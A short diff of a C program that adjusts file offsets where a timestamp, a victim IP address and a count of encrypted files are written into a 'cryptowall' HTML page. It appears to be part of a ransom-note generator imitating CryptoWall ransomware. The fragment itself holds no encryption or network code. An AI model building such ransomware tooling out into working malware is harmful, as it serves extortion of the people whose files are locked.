@@ -128,7 +128,7 @@ int main() {
 
   /// ADD DATE TO FILE
   FILE* cryptowall = fopen("cryptowall\\index.htm", "r+");
-  fseek(cryptowall, 295, SEEK_SET);
+  fseek(cryptowall, 304, SEEK_SET);
   fprintf(cryptowall, "%02u-%02u-%02u %02u:%02u:%02u", year, month,
           timeinfo->tm_mday, timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
 
@@ -140,7 +140,7 @@ int main() {
   fclose(loadip);
 
   /// ADD IP
-  fseek(cryptowall, 1507, SEEK_SET);
+  fseek(cryptowall, 1726, SEEK_SET);
   // ip may have different lengths: 0.0.0.0 / 255.255.255.255, pad with spaces
   char ipbuffer[16] = "               ";
   int ip_pad = sprintf(ipbuffer, "%u.%u.%u.%u", ip[0], ip[1], ip[2], ip[3]);
@@ -148,7 +148,7 @@ int main() {
   fwrite(ipbuffer, sizeof(char), 15, cryptowall);
 
   /// ADD Total Files Encrypted
-  fseek(cryptowall, 1667, SEEK_SET);
+  fseek(cryptowall, 1916, SEEK_SET);
   char cfbuffer[32];
   strcpy(cfbuffer, "      ");
   int cf_pad;
